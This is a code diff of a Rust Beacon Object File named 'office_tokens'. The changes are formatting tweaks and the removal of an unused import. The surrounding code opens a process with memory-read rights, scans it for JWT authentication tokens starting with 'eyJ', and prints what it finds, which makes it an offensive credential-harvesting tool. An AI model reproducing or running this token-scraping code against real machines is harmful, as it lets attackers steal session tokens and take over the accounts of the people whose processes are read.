@@ -11,11 +11,10 @@
 
 #![no_std]
 
-use alloc::string::String;
 use alloc::vec;
 use rustbof::data::DataParser;
 use rustbof::{eprintln, println};
-use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE};
+use windows_sys::Win32::Foundation::{CloseHandle, FALSE, GetLastError};
 use windows_sys::Win32::System::Threading::{
     OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
 };
@@ -68,7 +67,7 @@ fn find_pattern(buf: &[u8], pattern: &[u8], base: usize) -> usize {
         if &buf[i..i + pattern.len()] == pattern {
             let end = core::cmp::min(i + 80, buf.len());
             let snippet = &buf[i..end];
-            if snippet.iter().take(20).all(|&b| b >= 0x20 && b < 0x7f) {
+            if snippet.iter().take(20).all(|&b| (0x20..0x7f).contains(&b)) {
                 let s = core::str::from_utf8(&snippet[..core::cmp::min(snippet.len(), 64)])
                     .unwrap_or("<binary>");
                 println!("  [0x{:X}] {}", base + i, s);
@@ -92,11 +91,12 @@ fn main(args: *mut u8, len: usize) {
         return;
     }
 
-    println!("office_tokens: Scanning process {} for JWT tokens (eyJ prefix)", pid);
+    println!(
+        "office_tokens: Scanning process {} for JWT tokens (eyJ prefix)",
+        pid
+    );
 
-    let process = unsafe {
-        OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid)
-    };
+    let process = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid) };
     if process.is_null() {
         let err = unsafe { GetLastError() };
         eprintln!("Failed to open process {} (error {:#X})", pid, err);
@@ -156,7 +156,10 @@ fn main(args: *mut u8, len: usize) {
 
     unsafe { CloseHandle(process) };
 
-    println!("Scanned {} regions, found {} potential JWT token(s)", regions_scanned, total_found);
+    println!(
+        "Scanned {} regions, found {} potential JWT token(s)",
+        regions_scanned, total_found
+    );
     if total_found > 0 {
         println!("SUCCESS.");
     } else {
